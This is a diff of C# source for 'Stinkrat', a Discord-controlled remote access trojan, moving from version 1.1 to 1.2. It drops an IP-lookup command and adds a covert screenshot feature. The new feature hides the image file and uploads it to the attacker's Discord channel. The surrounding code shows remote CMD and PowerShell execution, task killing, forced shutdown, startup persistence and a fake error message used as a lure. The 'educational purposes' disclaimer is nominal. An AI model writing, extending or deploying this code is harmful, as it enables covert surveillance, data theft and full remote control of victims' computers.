@@ -1,9 +1,11 @@
 // Educational purposes only ;)
-// Stinkrat 1.1
+// Stinkrat 1.2
 using Discord;
 using Discord.WebSocket;
 using System.Diagnostics;
 using System.Net;
+using Point = System.Drawing.Point;
+using Rectangle = System.Drawing.Rectangle;
 
 /*
     Features
@@ -13,10 +15,10 @@ using System.Net;
     - Show open apps (!processes)
     - Kill tasks (!execute KILLTASK <task>)
     - Execute CMD Commands (!execute <command>) For powershell (!execute powershell <command>)
-    - Get IP (!ip)
     - Shutdown machine (!shutdown)
     - Fake notification sound (!notification)
     - Spam terminal windows (!terminals)
+    - Take a screenshot (!screenshot)
     - Autostarts when they boot up too
 */
 
@@ -27,6 +29,20 @@ namespace App
         public static void ShowMessage(string message)
         {
             MessageBox.Show(message, ":)", MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+ 
+        public static void Screenshot()
+        {
+            Rectangle resolution = Screen.PrimaryScreen.Bounds;
+            using(Bitmap bitmap = new Bitmap(resolution.Width, resolution.Height))
+            {
+                using(Graphics g = Graphics.FromImage(bitmap))
+                {
+                    g.CopyFromScreen(Point.Empty, Point.Empty, resolution.Size);
+                }
+                bitmap.Save("screenshot.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
+                File.SetAttributes("screenshot.jpg", FileAttributes.Hidden); // hide it!!!
+            }
         }
 
         public static string SystemInfo()
@@ -67,23 +83,6 @@ namespace App
             Process.Start("cmd.exe", "/C shutdown /s");
         }
 
-        public static string IP()
-        {
-            String address = "";
-            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
-            using (WebResponse response = request.GetResponse())
-            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
-            {
-                address = stream.ReadToEnd();
-            }
-
-            int first = address.IndexOf("Address: ") + 9;
-            int last = address.LastIndexOf("</body>");
-            address = address.Substring(first, last - first);
-
-            return $"IP: **`{address}`**";
-        }
-
         public static void StartUpPrograms()
         {
             // Remember to change this depending on the exe's name
@@ -120,10 +119,9 @@ namespace App
                 RedirectStandardOutput = true,
                 WorkingDirectory = @"C:\Windows\System32\"
             };
-
             System.Text.StringBuilder sb = new System.Text.StringBuilder();
             Process? p = Process.Start(processInfo);
-            p.OutputDataReceived += (sender, args) => sb.AppendLine(args.Data);
+            p!.OutputDataReceived += (sender, args) => sb.AppendLine(args.Data);
             p.BeginOutputReadLine();
             p.WaitForExit();
             return sb.ToString();
@@ -138,7 +136,7 @@ namespace App
         // replace these with the guild and channel id of where you want to control the bot
         ulong log_guild = 1012757688389734510;
         ulong log_channel = 1013091266973671557;
-        string TOKEN = "your bot token here"; // Keep this a secret
+        string TOKEN = "use your own bot token here"; // Keep this a secret
 
         // A fake error message will show when you run the program.
         //string message_content = "Graphics ERR in [UnityMain.dll] (0x0065e)";
@@ -210,11 +208,6 @@ namespace App
                     RAT.Execute(message.Content.Trim().Replace("!execute", ""));
                 }
 
-                if (message.Content == "!ip")
-                {
-                    await message.Channel.SendMessageAsync(RAT.IP());
-                }
-
                 if (message.Content == "!shutdown")
                 {
                     RAT.Shutdown();
@@ -240,6 +233,12 @@ namespace App
                         if (i + chunkSize > stringLength) chunkSize = stringLength - i;
                         await message.Channel.SendMessageAsync($"```{str.Substring(i, chunkSize)}```");
                     }
+                }
+
+                if (message.Content == "!screenshot")
+                {
+                    RAT.Screenshot(); // make and save the screenshot
+                    await message.Channel.SendFileAsync("screenshot.jpg");
                 }
             }
             catch (Exception e)
